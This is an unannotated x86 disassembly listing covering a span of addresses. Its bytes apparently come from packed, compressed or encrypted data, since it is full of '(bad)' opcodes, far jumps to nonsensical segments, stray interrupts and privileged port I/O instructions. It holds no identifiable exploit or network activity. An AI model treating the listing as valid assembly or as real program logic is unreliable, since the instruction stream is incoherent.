  40d7e9:	out    dx,eax
  40d7ea:	jl     0x40d7d6
  40d7ec:	call   0xdddb:0x63703ad8
  40d7f3:	(bad)  
  40d7f4:	out    0xca,al
  40d7f6:	xchg   esi,eax
  40d7f7:	leave  
  40d7f8:	mov    ebp,0x10742e42
  40d7fd:	sbb    ecx,DWORD PTR [edx-0x74]
  40d800:	push   cs
  40d801:	push   es
  40d802:	xchg   BYTE PTR ds:0x6dc4e0a2,bh
  40d808:	jmp    0x40d80a
  40d80a:	push   ebx
  40d80b:	(bad)  
  40d80c:	mov    ecx,0xf15db366
  40d811:	sub    al,0x6c
  40d813:	ins    DWORD PTR es:[edi],dx
  40d814:	add    edx,DWORD PTR [edi+0x63]
  40d817:	cmc    
  40d818:	fwait
  40d819:	repnz arpl WORD PTR [edi+eiz*8+0x42],di
  40d81e:	jecxz  0x40d7f6
  40d820:	outs   dx,BYTE PTR ds:[esi]
  40d821:	mov    ebp,0xda3e3584
  40d826:	mov    al,0x37
  40d828:	xor    BYTE PTR [ecx+0x6e],ah
  40d82b:	in     eax,dx
  40d82c:	mov    dl,0xe4
  40d82f:	adc    eax,DWORD PTR [esi]
  40d831:	cmp    al,0x20
  40d833:	sbb    DWORD PTR [ebx-0xe],edx
  40d836:	lds    eax,FWORD PTR [esi+eax*8+0x17]
  40d83a:	pop    ss
  40d83b:	sahf   
  40d83c:	(bad)  
  40d83d:	int    0x88
  40d83f:	not    BYTE PTR [ebp-0x5e]
  40d842:	mov    WORD PTR [edi],cs
  40d844:	mov    dh,0x6d
  40d846:	sbb    ebp,ebp
  40d848:	mov    ?,WORD PTR [edx]
  40d84a:	jge    0x40d894
  40d84c:	mov    esi,0xadf288e6
  40d851:	or     ebp,DWORD PTR [ebx-0x5f]
  40d854:	jne    0x40d843
  40d856:	xchg   DWORD PTR [eax+edx*2],ecx
  40d859:	xor    eax,0x43315f87
  40d85e:	xor    al,0x6d
  40d860:	pop    ss
  40d861:	xchg   esi,eax
  40d862:	ins    DWORD PTR es:[edi],dx
  40d863:	add    eax,0x7969de65
  40d868:	push   ecx
  40d869:	sub    DWORD PTR [esi+0x616dd4e7],esi
  40d86f:	mov    eax,ds:0x3d9e97e3
  40d874:	dec    eax
  40d875:	out    dx,eax
  40d876:	adc    al,0xfb
  40d878:	outs   dx,BYTE PTR ds:[esi]
  40d879:	xor    al,0x16
  40d87b:	jbe    0x40d82e
  40d87d:	push   cs
  40d87e:	call   0x9122abba
  40d883:	into   
  40d884:	xor    DWORD PTR [esi-0x59e925fd],0xa985988a
  40d88e:	jge    0x40d8dc
  40d890:	mov    WORD PTR [edx],cs
  40d892:	or     al,0x0
  40d894:	fcmovnbe st,st(6)
  40d896:	aam    0xdd
  40d898:	or     bh,al
  40d89a:	(bad)  [eax+0x17]
  40d89d:	ins    DWORD PTR es:[edi],dx
  40d89e:	pop    ss
  40d89f:	lds    edi,FWORD PTR [ecx-0x4014068e]
  40d8a5:	jl     0x40d8a2
  40d8a7:	ins    DWORD PTR es:[edi],dx
  40d8a8:	mov    bh,0x85
  40d8aa:	and    BYTE PTR es:[edx],0x4
  40d8ae:	or     al,0xb3
  40d8b0:	and    al,0x52
  40d8b2:	gs mov al,0x4d
  40d8b5:	shl    BYTE PTR [esi-0x5f],1
  40d8b8:	dec    ebp
  40d8b9:	cs jle 0x40d8c2
  40d8bc:	cwde   
  40d8bd:	sbb    DWORD PTR [ebx+0x6fcadbf8],ebp
  40d8c3:	sbb    esp,esp
  40d8c5:	add    ah,BYTE PTR [ebp-0x43]
  40d8c8:	pop    ds
  40d8c9:	add    BYTE PTR [eax+0xf],cl
  40d8cc:	jge    0x40d8d6
  40d8ce:	(bad)  
  40d8cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8d0:	ins    DWORD PTR es:[edi],dx
  40d8d1:	inc    ebx
  40d8d2:	jo     0x40d88d
  40d8d4:	shr    DWORD PTR [ebx+edx*4],1
  40d8d7:	jnp    0x40d92c
  40d8d9:	adc    al,0x2f
  40d8db:	pop    ebx
  40d8dc:	mov    ebx,0xc890b695
  40d8e1:	xchg   esp,eax
  40d8e2:	xor    BYTE PTR ds:0x32684f4a,0xea
  40d8e9:	mov    ebx,0x280b5b6d
  40d8ee:	leave  
  40d8ef:	loop   0x40d8b3
  40d8f1:	(bad)  
  40d8f2:	shl    edx,1
  40d8f4:	mov    esp,0xdba55647
  40d8f9:	ret    0x9046
  40d8fc:	enter  0xae3d,0x23
  40d900:	rcr    DWORD PTR [edx+0xe],0xa9
  40d904:	ins    DWORD PTR es:[edi],dx
  40d905:	dec    ebp
  40d906:	dec    ebx
  40d907:	enter  0x35fe,0x92
  40d90b:	gs xchg ebx,eax
  40d90d:	mov    eax,ds:0x85c7d265
  40d912:	ins    DWORD PTR es:[edi],dx
  40d913:	inc    ebp
  40d914:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d915:	adc    al,0x8b
  40d917:	jmp    0x40d8b2
  40d919:	jmp    0xc28d:0x12850b9b
  40d920:	mov    cl,0x40
  40d922:	loopne 0x40d8fa
  40d924:	call   0xc86d:0xb7443629
  40d92b:	call   0xad65e59
  40d930:	mov    BYTE PTR [ebp-0x4f523d5b],al
  40d936:	jno    0x40d937
  40d938:	dec    di
  40d93a:	mov    ecx,esp
  40d93c:	and    eax,0x805b5b6d
  40d941:	arpl   WORD PTR [ebx+ecx*8-0x2],sp
  40d945:	xor    bh,BYTE PTR [ebx-0x2917ded6]
  40d94b:	mov    eax,0x4e1f26b1
  40d950:	adc    DWORD PTR [ebp-0x7fc7eb85],ecx
  40d956:	lods   eax,DWORD PTR ds:[esi]
  40d957:	fstp   st(2)
  40d959:	mov    ?,WORD PTR [esi+edx*8+0x5968e68c]
  40d960:	jmp    FWORD PTR [ebx-0x38]
  40d963:	adc    al,0xdc
  40d965:	fisub  DWORD PTR [ebp+0x7fe7cbe9]
  40d96b:	pop    esp
  40d96c:	lds    ebp,FWORD PTR [ecx-0x2496b9c7]
  40d972:	jbe    0x40d9dd
  40d974:	sbb    bh,BYTE PTR [esi+0x44]
  40d977:	jb     0x40d98a
  40d979:	sub    esi,DWORD PTR [edx]
  40d97b:	stc    
  40d97c:	rcl    BYTE PTR [esi-0x6f6b3913],1
  40d982:	xor    BYTE PTR [ebx-0x38],dh
  40d985:	mov    BYTE PTR [edx],bh
  40d987:	pop    esp
  40d988:	test   DWORD PTR [ebx],ecx
  40d98a:	(bad)  [esi-0xb3a2790]
  40d990:	out    0x46,al
  40d992:	sbb    DWORD PTR [ecx],edi
  40d994:	repnz dec edi
  40d996:	inc    ebp
  40d997:	sub    al,0x6d
  40d999:	push   ecx
  40d99a:	jb     0x40d976
  40d99c:	out    0x43,al
  40d99e:	test   DWORD PTR ds:0xf8b8d83e,ecx
  40d9a4:	in     eax,0x98
  40d9a6:	mov    es,WORD PTR [eax-0x4bf86e5d]
  40d9ac:	fstp   st(2)
  40d9ae:	shl    bl,cl
  40d9b0:	adc    ecx,ebp
  40d9b2:	mov    bl,0x37
  40d9b4:	ja     0x40da1e
  40d9b6:	cmp    bl,bl
  40d9b8:	inc    esi
  40d9b9:	sbb    ebx,DWORD PTR [ebx+0x42]
  40d9bc:	push   0x1402477
  40d9c1:	cdq    
  40d9c2:	mov    WORD PTR [edi],ss
  40d9c4:	mov    BYTE PTR [esi],dl
  40d9c6:	push   ss
  40d9c7:	pop    esp
  40d9c8:	xchg   esp,eax
  40d9c9:	pop    ds
  40d9ca:	xchg   BYTE PTR [eax-0x47a1a234],ah
  40d9d0:	push   eax
  40d9d1:	cli    
  40d9d2:	fcom   QWORD PTR [eax-0x3]
  40d9d5:	dec    esp
  40d9d6:	sub    eax,DWORD PTR [eax]
  40d9d8:	jg     0x40da4e
  40d9da:	test   al,0x6a
  40d9dc:	test   al,0x70
  40d9de:	mov    ds:0xee6730a7,eax
  40d9e3:	mov    ch,0x8f
  40d9e5:	call   0x4d83:0xbadaab6
  40d9ec:	inc    ecx
  40d9ed:	fisttp WORD PTR [edx-0x64]
  40d9f0:	add    eax,0x796da02d
  40d9f5:	sti    
  40d9f6:	jecxz  0x40d9af
  40d9f8:	and    eax,0x3
  40d9fb:	pop    ebx
  40d9fc:	int    0x36
  40d9fe:	add    eax,edx
  40da00:	xchg   al,dl
  40da02:	dec    ebp
  40da03:	mov    al,0x75
  40da05:	mov    ds:0xcc5c2d92,eax
  40da0a:	mov    ?,WORD PTR [ebx-0x62]
  40da0d:	ja     0x40d9a7
  40da0f:	fisubr DWORD PTR [ebp-0x4bb8f6ff]
  40da15:	cmp    al,0xbc
  40da17:	aaa    
  40da18:	fnsave [esi+0xd861c16]
  40da1e:	mov    esp,0xba412c07
  40da23:	sub    ch,BYTE PTR [ebx+0x2a]
  40da26:	ds mov al,0x74
  40da29:	or     ebp,DWORD PTR [eax-0x4962c42f]
  40da2f:	outs   dx,BYTE PTR ds:[esi]
  40da31:	sub    eax,0x20ab71a8
  40da36:	mov    ds:0x4ed5712f,al
  40da3b:	mov    ebx,0x509605a2
  40da40:	inc    esi
  40da41:	scas   al,BYTE PTR es:[edi]
  40da42:	cmp    BYTE PTR [ebx-0x20],bl
  40da45:	push   edi
  40da46:	ins    DWORD PTR es:[edi],dx
  40da47:	add    eax,ecx
  40da49:	push   ss
  40da4a:	dec    esi
  40da4b:	js     0x40daa9
  40da4d:	nop
  40da4e:	les    esp,FWORD PTR [ecx+0xb0ab6d]
  40da54:	or     ch,ch
  40da56:	jl     0x40dabf
  40da58:	mov    cl,0x50
  40da5a:	and    esi,DWORD PTR [edx]
  40da5c:	adc    al,0xdb
  40da5e:	xchg   esi,eax
  40da5f:	int    0x14
  40da61:	xchg   eax,ebx
  40da63:	mov    bl,al
  40da65:	fisubr DWORD PTR [ebp+0x61]
  40da68:	or     DWORD PTR [ebx+eiz*8],ebx
  40da6b:	cwde   
  40da6c:	ficom  DWORD PTR [ecx+0x6edcc21a]
  40da72:	jne    0x40dab4
  40da74:	aaa    
  40da75:	sub    al,0xef
  40da77:	inc    edx
  40da78:	popf   
  40da79:	(bad)  
  40da7a:	cmp    ebx,ebp
  40da7c:	ins    DWORD PTR es:[edi],dx
  40da7d:	ret    0xd2c2
  40da80:	(bad)  
  40da81:	dec    ebp
  40da82:	inc    edi
  40da83:	cmp    al,0xad
  40da85:	jbe    0x40da4e
  40da87:	iret   
  40da88:	pop    ds
  40da89:	test   DWORD PTR [edx+0x6c],edx
  40da8c:	in     eax,dx
  40da8d:	into   
  40da8e:	sbb    ebx,edx
  40da90:	jno    0x40da3b
  40da92:	cs mov eax,0xd176142c
  40da98:	int    0x39
  40da9a:	and    BYTE PTR [edx-0x7bad6541],bl
  40daa0:	fistp  DWORD PTR [edx-0x26]
  40daa3:	dec    esp
  40daa4:	idiv   DWORD PTR [edx-0x75]
  40daa7:	mov    al,BYTE PTR es:[esi-0x4b]
  40daab:	mov    WORD PTR [esi+0xd],gs
  40daae:	test   al,0x71
  40dab0:	scas   eax,DWORD PTR es:[edi]
  40dab1:	sub    BYTE PTR [esi+ebp*8-0x22e99b41],al
  40dab8:	fiadd  DWORD PTR [esi-0x741b9a26]
  40dabe:	scas   al,BYTE PTR es:[edi]
  40dabf:	sbb    bh,BYTE PTR [esi]
  40dac1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dac2:	push   ds
  40dac3:	mov    dl,0x82
  40dac5:	test   DWORD PTR ds:0xb5814aa2,ecx
  40dacb:	dec    ecx
  40dacc:	cwde   
  40dacd:	jge    0x40daab
  40dacf:	or     bh,BYTE PTR [ebx]
  40dad1:	or     bl,BYTE PTR [esi+0x11d2a0a2]
  40dad7:	mov    dh,0x6c
  40dad9:	or     ah,dl
  40dadb:	pop    eax
  40dadc:	mov    eax,0x1a200a6d
  40dae1:	test   al,0xcf
  40dae3:	dec    edi
  40dae4:	test   eax,0xc2c6e0c6
  40dae9:	mov    dh,0xdd
  40daeb:	bound  esp,QWORD PTR [edi-0x6ac80a3]
  40daf1:	pop    eax
  40daf2:	(bad)  
  40daf3:	pop    ebx
  40daf4:	lods   eax,DWORD PTR ds:[esi]
  40daf5:	mov    ds:0xfc75d289,al
  40dafa:	pop    ds
  40dafb:	pop    ebx
  40dafc:	rol    DWORD PTR [edi],0x6e
  40daff:	dec    ebx
  40db00:	jmp    0xf7a4fb64
  40db05:	push   edi
  40db06:	pop    edi
  40db07:	retf   
  40db08:	sbb    DWORD PTR [ebx],0x495c175b
  40db0e:	sbb    DWORD PTR [ebx-0x45c13f00],0x6d
  40db15:	fcmovnu st,st(2)
  40db17:	in     eax,dx
  40db18:	mov    esi,0x2d747e9
  40db1d:	mov    eax,ds:0x2c68114a
  40db22:	ss mov dh,0x36
  40db25:	fisubr DWORD PTR [ebp-0x18]
  40db28:	mov    eax,esi
  40db2a:	daa    
  40db2b:	lods   al,BYTE PTR ds:[esi]
  40db2c:	mov    dl,0x4b
  40db2e:	jb     0x40db0b
  40db30:	add    eax,0x3725b636
  40db35:	repz sbb eax,0x383635ae
  40db3b:	inc    esp
  40db3c:	and    eax,0x536d5708
  40db41:	retf   
  40db42:	out    dx,al
  40db43:	or     eax,0x8585da17
  40db48:	dec    ebx
  40db49:	call   0xc36b45ee
  40db4e:	inc    ecx
  40db4f:	adc    edi,DWORD PTR [edx]
  40db51:	ficom  WORD PTR [ecx+eiz*1+0x28]
  40db55:	ins    BYTE PTR es:[edi],dx
  40db56:	clc    
  40db57:	adc    DWORD PTR [eax-0x48eae31a],ecx
  40db5d:	pop    edx
  40db5e:	ins    BYTE PTR es:[edi],dx
  40db5f:	xchg   ecx,eax
  40db60:	jge    0x40db1c
  40db62:	jp     0x40dbbf
  40db64:	stos   BYTE PTR es:[edi],al
  40db65:	push   ss
  40db66:	and    al,BYTE PTR ds:0xe33da2b3
  40db6c:	lods   eax,DWORD PTR ds:[esi]
  40db6d:	mov    al,0xfd
  40db6f:	push   0x71b80ddc
  40db74:	adc    DWORD PTR [ecx+ebp*4+0x17],esi
  40db78:	or     ecx,DWORD PTR ds:0x1d91db40
  40db7e:	clc    
  40db7f:	(bad)  
  40db80:	jge    0x40db10
  40db82:	and    bl,cl
  40db84:	inc    esi
  40db85:	mov    ebx,0x55d76db1
  40db8a:	push   cs
  40db8b:	aad    0xea
  40db8d:	lea    esi,[esi+edi*8]
  40db90:	add    WORD PTR [ebx],cx
  40db93:	adc    al,0xdb
  40db95:	jmp    0x9cf9edb
  40db9a:	lods   eax,DWORD PTR ds:[esi]
  40db9b:	adc    DWORD PTR [ebp+0x1201dc4d],esi
  40dba1:	or     BYTE PTR [ebx],al
  40dba3:	xchg   edx,eax
  40dba4:	fstp   QWORD PTR [edx-0x28]
  40dba7:	fimul  DWORD PTR [edx-0x1cad3fb]
  40dbad:	loop   0x40db9c
  40dbaf:	xor    DWORD PTR [edx+esi*2+0x78ab6b6d],ebx
  40dbb6:	fcom   DWORD PTR fs:[esi+0x4b05ee94]
  40dbbd:	mov    bh,0xda
  40dbbf:	ror    BYTE PTR ds:0xfb0bef8e,cl
  40dbc5:	jg     0x40dc43
  40dbc7:	neg    BYTE PTR [ecx-0x1f]
  40dbca:	out    dx,eax
  40dbcb:	(bad)  
  40dbcc:	ss push ecx
  40dbce:	mov    DWORD PTR cs:[esi+0x3ba5e69b],edi
  40dbd5:	sbb    bl,ch
  40dbd7:	mov    dh,0x8d
  40dbd9:	ret    0x898a
  40dbdc:	(bad)  
  40dbdd:	daa    
  40dbde:	sub    bh,dl
  40dbe0:	aaa    
  40dbe1:	or     BYTE PTR [ecx+0x2942eb20],ah
  40dbe7:	mov    ds:0x4879097a,al
  40dbec:	neg    DWORD PTR [esi-0x26]
  40dbef:	test   al,0x8d
  40dbf1:	test   BYTE PTR [eax+0x669c745b],0x1b
  40dbf8:	dec    eax
  40dbf9:	fild   DWORD PTR [eax+esi*4]
  40dbfc:	mov    eax,ds:0xf571fcc8
  40dc01:	cli    
  40dc02:	daa    
  40dc03:	and    esp,eax
  40dc05:	(bad)  
  40dc06:	mov    dh,0x6d
  40dc08:	icebp  
  40dc09:	stos   BYTE PTR es:[edi],al
  40dc0a:	imul   ebx,DWORD PTR [ecx+0x61],0x80d45f4d
  40dc11:	mov    ds:0x2489b1b4,eax
  40dc16:	cmp    ch,BYTE PTR [edx+0x66dab709]
  40dc1c:	fld    TBYTE PTR [edx-0x25]
  40dc1f:	ins    DWORD PTR es:[edi],dx
  40dc20:	neg    BYTE PTR [edi-0x10]
  40dc23:	loopne 0x40dc7b
  40dc25:	shl    DWORD PTR [eax+0x37e02576],1
  40dc2b:	xchg   esi,eax
  40dc2c:	pusha  
  40dc2d:	popa   
  40dc2e:	or     DWORD PTR [edx+edi*2-0x5f],edi
  40dc32:	or     BYTE PTR [ebp+0x51ad00b3],0x2e
  40dc39:	xchg   esi,eax
  40dc3a:	inc    eax
  40dc3b:	sbb    al,BYTE PTR [ebp+0x5d]
  40dc3e:	pop    edi
  40dc3f:	mov    cl,0x6d
  40dc41:	mov    bh,0xb6
  40dc43:	inc    esp
  40dc44:	or     BYTE PTR [eax],bh
  40dc46:	sub    BYTE PTR [edx-0x67],dl
  40dc49:	and    BYTE PTR [ebp-0x2ff8509b],bh
  40dc4f:	lea    ebp,[ebp+0x21062ccf]
  40dc55:	jbe    0x40dc0c
  40dc57:	popa   
  40dc58:	mov    dh,0x5b
  40dc5a:	or     ebp,DWORD PTR [ebp+0x34]
  40dc5d:	mov    ecx,0xbe224c4d
  40dc62:	adc    esi,ebp
  40dc64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc65:	push   ebx
  40dc66:	sbb    edx,0xdf8f221a
  40dc6c:	aam    0xec
  40dc6e:	xchg   DWORD PTR [ebp+0x19575a05],ecx
  40dc74:	adc    edx,ebx
  40dc76:	adc    dh,ch
  40dc78:	xor    BYTE PTR ds:0xc1b63711,cl
  40dc7e:	cwde   
  40dc7f:	out    dx,al
  40dc80:	xor    esi,DWORD PTR [edx-0x752cf7f3]
  40dc86:	fsubr  DWORD PTR [esi+0x1b]
  40dc89:	data16 shl BYTE PTR [ebx+0x780245db],1
  40dc90:	fcom   DWORD PTR [esi]
  40dc92:	push   0x6b
  40dc94:	(bad)  
  40dc95:	retf   0xc7c2
  40dc98:	ins    DWORD PTR es:[edi],dx
  40dc99:	das    
  40dc9a:	jno    0x40dc62
  40dc9c:	sub    eax,0x495b6d6c
  40dca1:	sbb    al,0x14
  40dca3:	stc    
  40dca4:	out    dx,eax
  40dca5:	dec    edx
  40dca6:	jno    0x40dd27
  40dca8:	pop    edi
  40dca9:	fcmovb st,st(2)
  40dcab:	mov    dh,0x40
  40dcad:	lock stos DWORD PTR es:[edi],eax
  40dcaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcb0:	xchg   edi,eax
  40dcb1:	jae    0x40dcb2
  40dcb3:	sbb    al,bh
  40dcb5:	ins    DWORD PTR es:[edi],dx
  40dcb6:	fist   DWORD PTR [esi]
  40dcb8:	mov    eax,0x74037721
  40dcbd:	retf   
  40dcbe:	adc    ebp,edi
  40dcc0:	inc    edx
  40dcc1:	dec    ebx
  40dcc2:	stos   DWORD PTR es:[edi],eax
  40dcc3:	inc    esp
  40dcc4:	(bad)  
  40dcc5:	fild   DWORD PTR [esi]
  40dcc7:	xor    eax,0x606062ed
  40dccc:	or     dl,BYTE PTR [ebx-0x3f]
  40dccf:	ins    DWORD PTR es:[edi],dx
  40dcd0:	popa   
  40dcd1:	bound  esi,QWORD PTR [eax+0x6e]
  40dcd4:	adc    DWORD PTR ds:[ebx+0xb],ecx
  40dcd8:	je     0x40dd1a
  40dcda:	pop    ebx
  40dcdb:	push   esp
  40dcdc:	xchg   esp,eax
  40dcdd:	loope  0x40dce4
  40dcdf:	adc    ebx,DWORD PTR [edi+0xbe585c5]
  40dce5:	jo     0x84f3dcf1
  40dceb:	pop    eax
  40dcec:	xchg   edx,eax
  40dced:	cmp    eax,0x5d5b6cb8
  40dcf2:	imul   al
  40dcf4:	mov    ss,WORD PTR cs:[edx+0x6b13dea0]
  40dcfb:	mov    ds:0x58675a58,al
  40dd00:	sub    al,0x6b
  40dd02:	cwde   
  40dd03:	imul   eax,DWORD PTR [edx],0x6db636dd
  40dd09:	mov    ecx,0x646ef94d
  40dd0e:	jle    0x40dcf3
  40dd10:	xor    bh,BYTE PTR [edx+0x4]
  40dd13:	mov    eax,0x29a0ead0
  40dd18:	push   ebx
  40dd19:	lahf   
  40dd1a:	jns    0x40dd68
  40dd1c:	dec    eax
  40dd1d:	out    0xb7,eax
  40dd1f:	ins    DWORD PTR es:[edi],dx
  40dd20:	test   eax,0xe01cf123
  40dd25:	rol    DWORD PTR ds:0xd678683d,1
  40dd2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd2c:	stos   BYTE PTR es:[edi],al
  40dd2d:	jo     0x40dd9a
  40dd2f:	sbb    eax,0x13dd569b
  40dd34:	test   al,0x8b
  40dd36:	mov    edx,0x70d8adfc
  40dd3b:	test   BYTE PTR [eax],0x59
  40dd3e:	aad    0x0
  40dd40:	inc    esi
  40dd41:	pop    esp
  40dd42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd43:	(bad)  ds:0xb4a1ad6e
  40dd49:	jg     0x40dd06
  40dd4b:	out    0xfe,al
  40dd4d:	int    0x5c
  40dd4f:	sbb    dl,bl
  40dd51:	adc    BYTE PTR [edx-0x4c],0x7d
  40dd55:	mov    edi,0x106ab8e0
  40dd5a:	(bad)  [eax-0x61]
  40dd5d:	or     al,0x58
  40dd5f:	ins    BYTE PTR es:[edi],dx
  40dd60:	(bad)
  40dd63:	sub    ch,BYTE PTR [esi]
  40dd65:	call   0x112cae20
  40dd6a:	xchg   ecx,eax
  40dd6b:	mov    al,ch
  40dd6d:	jbe    0x40dcf6
  40dd6f:	and    BYTE PTR [ebp+0x17],ch
  40dd72:	mov    dh,0xd6
  40dd74:	rdtsc  
  40dd76:	call   0xe6cbe0e9
  40dd7b:	test   DWORD PTR [edi-0x42],ebx
  40dd7e:	pop    ss
  40dd7f:	fidiv  DWORD PTR [esi-0x7249f294]
  40dd85:	lds    ecx,FWORD PTR [eax-0x6b057d50]
  40dd8b:	imul   ebp,DWORD PTR [ecx-0x25],0x1a
  40dd8f:	repz pop DWORD PTR [edx]
  40dd92:	cmp    BYTE PTR [edi],dl
  40dd94:	adc    edi,eax
  40dd96:	xor    al,0x1f
  40dd98:	fstp   st(2)
  40dd9a:	ins    DWORD PTR es:[edi],dx
  40dd9b:	ja     0x40dd3e
  40dd9d:	xor    BYTE PTR [ecx-0x2e62dcf2],dh
  40dda3:	fstp   DWORD PTR [eax+edx*2]
  40dda6:	popa   
  40dda7:	fld    TBYTE PTR [esi-0x7d]
  40ddaa:	dec    esp
  40ddab:	sti    
  40ddac:	xor    eax,0x169302d2
  40ddb1:	popa   
  40ddb2:	arpl   WORD PTR [ebx+0x585ee3d0],bp
  40ddb8:	call   0xb6dd:0x1cb66db
  40ddbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ddc0:	jbe    0x40dd87
  40ddc2:	js     0x40ddcc
  40ddc4:	xor    eax,0x8d59b52
  40ddc9:	in     al,0x7e
  40ddcb:	outs   dx,BYTE PTR ds:[esi]
  40ddcc:	sbb    ecx,DWORD PTR [esi+0x7402f2b6]
  40ddd2:	pushf  
  40ddd3:	iret   
  40ddd4:	scas   eax,DWORD PTR es:[edi]
  40ddd5:	imul   esi,DWORD PTR [eax-0x48eff2f0],0xffffffaf
  40dddc:	cwde   
  40dddd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ddde:	add    dl,BYTE PTR [ebp+eax*1+0xe08b00]
  40dde5:	outs   dx,BYTE PTR ds:[esi]
  40dde6:	or     ecx,DWORD PTR [edx]
  40dde8:	hlt    
  40dde9:	adc    DWORD PTR [ecx-0x14],ecx
  40ddec:	push   cs
  40dded:	mov    eax,ds:0xb55b1b01
  40ddf2:	mov    ebp,0x8e3fe230
  40ddf7:	fist   DWORD PTR [esi+0x19df6168]
  40ddfd:	aam    0xcc
  40ddff:	ja     0x40de48
  40de01:	sbb    ch,BYTE PTR [ebp+0x6342c2ed]
  40de07:	arpl   WORD PTR [ebx-0x1b],cx
  40de0a:	cmp    ebp,DWORD PTR [eax]
  40de0c:	cmp    al,0xa7
  40de0e:	push   ebx
  40de0f:	test   DWORD PTR [ebp+0x1926eab],ebp
  40de15:	imul   eax,DWORD PTR [ebx+0x56],0x2f
  40de19:	jecxz  0x40ddee
  40de1b:	retf   
  40de1c:	xchg   ebp,eax
  40de1d:	(bad)  [esi-0x340ae5f9]
  40de23:	hlt    
  40de24:	xlat   BYTE PTR ds:[ebx]
  40de25:	pop    edi
  40de26:	jbe    0x40ddfe
  40de28:	inc    esp
  40de29:	jno    0x40de8e
  40de2b:	jmp    0x5697:0x9859ed00
  40de32:	loopne 0x40de06
  40de34:	rol    dh,cl
  40de36:	nop
  40de37:	loope  0x40de12
  40de39:	(bad)  [edx-0x77]
  40de3c:	sti    
  40de3d:	mov    edi,0xe85b70b
  40de42:	cmc    
  40de43:	loope  0x40de52
  40de45:	push   ecx
  40de46:	push   cs
  40de47:	xchg   ecx,eax
  40de48:	pusha  
  40de49:	jl     0x40de5d
  40de4b:	inc    edx
  40de4c:	mov    ebx,0x86655435
  40de51:	sub    al,0x94
  40de53:	sbb    eax,0xbb171fc8
  40de58:	stos   BYTE PTR es:[edi],al
  40de59:	in     eax,dx
  40de5a:	rcl    DWORD PTR [edi],1
  40de5c:	mov    dh,0x2d
  40de5e:	(bad)  
  40de5f:	pushf  
  40de60:	and    DWORD PTR [ecx],esp
  40de62:	pop    edx
  40de63:	pusha  
  40de64:	imul   eax,eax,0x7b
  40de67:	(bad)  
  40de68:	pop    edx
  40de6a:	push   ds
  40de6b:	pop    edx
  40de6c:	mov    al,0x89
  40de6e:	bound  ebp,QWORD PTR [ebx+0x68]
  40de71:	jmp    0x13e4:0x6d71bc80
  40de78:	in     eax,dx
  40de79:	inc    esi
  40de7a:	pop    es
  40de7b:	and    BYTE PTR [esi],ah
  40de7d:	add    BYTE PTR [ebx],dh
  40de7f:	pushf  
  40de80:	jp     0x40de7f
  40de82:	lds    eax,FWORD PTR [edx+0x35]
  40de85:	or     BYTE PTR [ebx-0x64fe6f27],dl
  40de8b:	bound  eax,QWORD PTR [edi]
  40de8d:	imul   esi,DWORD PTR [edi+eax*1]
  40de91:	adc    al,0xc6
  40de93:	(bad)  
  40de94:	mov    dh,0xb1
  40de96:	aad    0xc3
  40de98:	ss xor al,0x2a
  40de9b:	jnp    0x40ded2
  40de9d:	fwait
  40de9e:	das    
  40de9f:	daa    
  40dea0:	or     edx,DWORD PTR [eax]
  40dea2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dea3:	loop   0x40de6f
  40dea5:	in     al,0x13
  40dea7:	or     DWORD PTR [esi-0x4a],edi
  40deaa:	pop    ebx
  40deab:	fild   DWORD PTR [esi+0x79]
  40deae:	cdq    
  40deaf:	das    
  40deb0:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40deb2:	pop    ebx
  40deb3:	cdq    
  40deb4:	push   ebx
  40deb5:	lock ins DWORD PTR es:[edi],dx
  40deb7:	mov    ebx,0xc8bb15b4
  40debc:	push   ecx
  40debd:	cmp    ebx,DWORD PTR [edx-0x185a674]
  40dec3:	mov    dh,0xb
  40dec5:	ins    DWORD PTR es:[edi],dx
  40dec6:	adc    DWORD PTR [ecx+0x74],0x38
  40deca:	stos   BYTE PTR es:[edi],al
  40decb:	mov    ch,al
  40decd:	add    esi,DWORD PTR [ebp+ebx*2-0x4a]
  40ded1:	pop    ebp
  40ded2:	push   0x2e9aeaa0
  40ded7:	mov    WORD PTR [ebp-0x65],fs
  40deda:	push   es
  40dedb:	shl    DWORD PTR [esi-0x7f24948b],1
  40dee1:	dec    edx
  40dee2:	aas    
  40dee3:	sbb    eax,0xe854dfcb
  40dee8:	xchg   edi,eax
  40dee9:	inc    edi
  40deea:	aam    0xb6
  40deec:	add    dl,0x56
  40deef:	sar    edi,0xf5
  40def2:	inc    ecx
  40def3:	pop    ebx
  40def4:	jmp    0x40deac
  40def6:	mov    ch,0x26
  40def8:	addr16 dec esp
  40defa:	add    eax,0x22c57e5c
  40deff:	mov    DWORD PTR [edx+0x4bb5b0b6],esi
  40df05:	fwait
  40df06:	fs (bad) 
  40df08:	pop    ecx
  40df09:	into   
  40df0a:	and    eax,DWORD PTR [ecx]
  40df0c:	xor    dl,BYTE PTR [edi]
  40df0e:	test   DWORD PTR [ebp-0x2cb1f72],ebp
  40df14:	or     bh,BYTE PTR [edi+0x61]
  40df17:	dec    di
  40df19:	mov    DWORD PTR [edx-0x7cb694bf],edi
  40df1f:	jmp    0xadc33dfa
  40df24:	lods   eax,DWORD PTR ds:[esi]
  40df25:	ins    DWORD PTR es:[edi],dx
  40df26:	mov    ds:0xfb159ce9,eax
  40df2b:	lea    edx,[ebx]
  40df2d:	cwde   
  40df2e:	sub    edi,DWORD PTR [eax-0x745fca4c]
  40df34:	(bad)  
  40df35:	sbb    esp,DWORD PTR [edi+0x2b3cef86]
  40df3b:	pop    ss
  40df3c:	call   0x9fdecc69
  40df41:	pop    esi
  40df42:	xor    cl,BYTE PTR [ebx]
  40df44:	or     al,0xd5
  40df46:	mov    dl,0x74
  40df48:	lds    edi,FWORD PTR [esi-0x7d]
  40df4b:	fs and al,0x26
  40df4e:	push   edi
  40df4f:	jno    0x40df2c
  40df51:	add    BYTE PTR [eax-0x2d],ch
  40df54:	fst    QWORD PTR [esi+0x52]
